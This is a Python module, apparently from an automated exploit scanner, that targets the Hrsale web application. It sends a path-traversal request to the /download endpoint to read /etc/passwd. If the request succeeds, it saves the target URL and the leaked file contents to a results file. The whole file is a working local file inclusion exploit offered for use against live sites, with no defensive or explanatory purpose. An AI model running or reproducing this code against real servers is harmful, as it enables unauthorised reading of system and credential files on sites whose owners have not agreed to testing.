import requests
from Exploits.colors import *


def Hrsale(url):
    test = requests.get(url+"/download?type=files&filename=../../../../../../../../etc/passwd", timeout=5)
    if test.status_code == 200:
        if "root:x" in test.text:
            filename = "Results/"+url.replace("http://", '').replace('/', '').replace("https:", "")+".txt"
            with open(filename, "a+") as f:
                f.write(f"Exploit: {test.url}"+test.text+ '\n')
            print(f"{PURPLE} [ {GREEN}$ {PURPLE}]{RESET} Hrsale LFI {PURPLE}=> {GREEN}Vuln {RESET}results saved to {GREEN}{filename}")
    else:
        print(f"{PURPLE} [ {GREEN}! {PURPLE}]{RESET} Hrsale LFI {PURPLE}=> {RED}Not Vuln")
